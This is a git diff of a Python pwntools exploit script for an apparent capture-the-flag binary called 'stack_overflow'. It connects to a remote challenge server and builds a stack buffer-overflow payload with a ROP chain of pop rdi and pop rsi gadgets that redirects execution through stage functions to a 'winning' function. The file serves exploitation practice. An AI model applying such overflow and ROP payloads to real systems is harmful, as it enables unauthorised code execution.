@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 from pwn import *
+from pwnlib.gdb import *
 
 STACK_OFFSET = -0xc
 
@@ -9,20 +10,19 @@ context(arch='amd64', os='linux')
 e = ELF('./stack_overflow')
 
 r = remote('111.186.57.85', 30013)
-
+# r = process('./stack_overflow')
+# gdb.attach(r)
 # Stack Overflooooow
-print(r.recv().decode(), end='')
+print(r.recvline().decode(), end='')
 
 # Stage1
-print(r.recv().decode(), end='')
+print(r.recvline().decode(), end='')
 
 
 payload = []
 
-payload += [0xbe, 0xba, 0xfe, 0xca]
-payload += [0xef, 0xbe, 0xad, 0xde]
-for i in range(9):
-    payload += [i, 0xbe, 0xad, 0xde]
+for i in range(11):
+    payload += [0xaa, 0xbc, 0xcc, 0xdd]
 
 # !
 payload += [0x21, 0x43, 0x65, 0x87]
@@ -30,54 +30,49 @@ payload += [0x21, 0x43, 0x65, 0x87]
 #  word_size = 64, endianness = 'little')
 # print(bytes(stage_1_key))
 
-stage_1_ret_addr = e.symbols['stage3']
-print("stage 1 ret addr:", stage_1_ret_addr)
 
 # payload += [0xbe, 0xba, 0xfe, 0xca]
 # payload += [0xef, 0xbe, 0xad, 0xde]
-# !
 
-payload += [0xf0, 0xbc, 0x29, 0x28]
-# !
-payload += [0xff, 0x7f, 0x00, 0x00]
-# should be 0x7fffffffdee0
 
-payload += util.packing.pack(stage_1_ret_addr,
+payload += [0xaa, 0xbc, 0xcc, 0xdd]
+payload += [0x78, 0x56, 0x34, 0x12]
+
+stage_2_addr = e.symbols['stage2']
+print("stage 2 addr:", stage_2_addr)
+
+payload += util.packing.pack(stage_2_addr,
                              word_size=64, endianness='little')
 
-# Stage2
-# print(r.recv().decode(), end='')
-# payload += util.packing.pack(stage_1_ret_addr,
-#                              word_size=64, endianness='little')
-payload += [0x78, 0x56, 0x34, 0x12]
 
-payload += [0x78, 0x56, 0x34, 0x12]
+# 0x00000000004008d3 : pop rdi ; ret
+set_rdi = util.packing.pack(0x4008d3, word_size=64, endianness='little')
+payload += set_rdi
 
-payload += [0x78, 0x56, 0x34, 0x12]
-payload += [0x78, 0x56, 0x34, 0x12]
-payload += [0x78, 0x56, 0x34, 0x12]
-payload += [0x78, 0x56, 0x34, 0x12]
+payload += util.packing.pack(0xcafebabe, word_size=64, endianness='little')
 
-# !
-payload += [0xef, 0xbe, 0xad, 0xde]
 
-# !
-payload += [0xbe, 0xba, 0xfe, 0xca]
+# 0x00000000004008d3 : pop rsi ; pop r15 ; ret
+set_rsi = util.packing.pack(0x4008d1, word_size=64, endianness='little')
+payload += set_rsi
 
-payload += [0x78, 0x56, 0x34, 0x12]
-payload += [0x78, 0x56, 0x34, 0x12]
+payload += util.packing.pack(0xdeadbeef, word_size=64, endianness='little')
+payload += util.packing.pack(0xdeadbeef, word_size=64, endianness='little')
 
-stage_2_ret_addr = e.symbols['stage2']
-# stage_2_ret_addr = 0x400753
-# print("stage 2 ret addr (offset by 0xe):", stage_2_ret_addr)
-payload += util.packing.pack(stage_2_ret_addr,
+
+stage_3_addr = e.symbols['stage3']
+print("stage 3 addr:", stage_3_addr)
+
+payload += util.packing.pack(stage_3_addr,
                              word_size=64, endianness='little')
 
-stage_3_ret_addr = e.symbols['winning']
-# stage_2_ret_addr = 0x400753
-# print("stage 2 ret addr (offset by 0xe):", stage_2_ret_addr)
-payload += util.packing.pack(stage_3_ret_addr,
+winning_addr = e.symbols['winning']
+print("winning addr:", winning_addr)
+
+
+payload += util.packing.pack(winning_addr,
                              word_size=64, endianness='little')
+
 
 with open('./payload.ply', 'wb') as f:
     f.write(bytes(payload))
